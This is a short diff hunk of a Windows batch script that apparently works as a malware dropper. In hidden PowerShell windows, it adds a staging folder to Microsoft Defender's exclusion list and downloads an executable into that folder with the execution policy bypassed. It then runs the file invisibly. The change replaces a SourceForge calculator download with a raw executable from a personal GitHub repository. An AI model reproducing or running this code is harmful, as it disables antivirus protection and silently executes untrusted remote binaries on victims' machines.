@@ -6,7 +6,7 @@ mkdir "%STAGE%" 2>nul
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"
 
-if not exist "%STAGE%\test.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://downloads.sourceforge.net/project/simple-calc/bin/Calculator.exe?ts=gAAAAABq_ViNHrue_EU8tv9btzypJRgLO4vGSsCNFEYVL0nlSTVOnHfNK-Uex9cn1pQrzWXw92BctBb63jCdtbpfvwiaOULMzA%3D%3D&r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fsimple-calc%2Ffiles%2Flatest%2Fdownload' -OutFile '%STAGE%\test.exe' -UseBasicParsing"
+if not exist "%STAGE%\test.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/GMO298/GMO298/raw/refs/heads/main/test.exe' -OutFile '%STAGE%\test.exe' -UseBasicParsing"
 cd /d "%STAGE%"
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\test.exe' -WindowStyle Hidden
 
